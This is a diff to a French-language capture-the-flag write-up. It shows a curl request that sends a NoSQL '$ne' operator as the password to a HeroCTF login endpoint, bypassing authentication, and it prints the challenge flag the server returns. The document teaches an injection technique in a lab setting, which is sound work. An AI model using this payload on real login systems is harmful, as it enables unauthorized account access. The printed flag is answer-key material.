@@ -36,7 +36,9 @@ Nous testons donc un payload assez simple :
 Le nom d'utilisateur est "admin" et le mot de passe n'est pas égal (not equal => $ne) à "notvalidpassword".
 
 ```sh
-curl -X POST --header "Content-Type: application/json" challs.heroctf.fr:3000/login --data '{"username":"admin", "password": {"$ne": "toto"}}'
+curl -X POST --header "Content-Type: application/json" challs.heroctf.fr:3000/login \
+    --data '{"username":"admin", "password": {"$ne": "notvalidpassword"}}'
+
 {"state":"success","msg":"You can validate this challenge with: Hero{NoSQL_1Nject1on_wAw_1597}"}
 ```
 
